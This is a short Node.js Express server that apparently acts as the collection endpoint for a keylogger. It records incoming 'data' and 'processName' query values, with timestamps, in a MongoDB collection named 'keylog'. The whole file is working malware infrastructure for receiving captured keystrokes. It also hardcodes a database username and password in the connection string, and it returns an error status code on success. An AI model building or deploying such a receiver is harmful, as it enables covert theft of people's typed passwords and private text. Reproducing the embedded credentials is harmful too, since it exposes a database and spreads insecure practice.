const express = require("express");
const morgan = require("morgan");
const mongoose = require("mongoose");
const port = 80;
const url_db =
    "mongodb+srv://016526585700:016526585700@cluster0.xzigp.mongodb.net/doanmang?retryWrites=true&w=majority";
const app = express();

app.use(morgan("tiny"));
mongoose.connect(url_db, { useNewUrlParser: true, useUnifiedTopology: true });

const processSchema = new mongoose.Schema({
    time: {
        type: Date,
        default: Date(),
    },
    processName: {
        type: String,
    },
    data: {
        type: String,
    },
});

const Keylog = mongoose.model("keylog", processSchema);

app.get("/", async (req, res) => {
    try {
        const { data, processName } = req.query;
        await Keylog.create({ data, processName });
        res.status(400).json({
            msg: "Success",
        });
    } catch (error) {
        res.status(400).json({
            msg: "Failed",
        });
    }
});

app.listen(port, () => {
    console.log(`app run port = ${port}`);
});
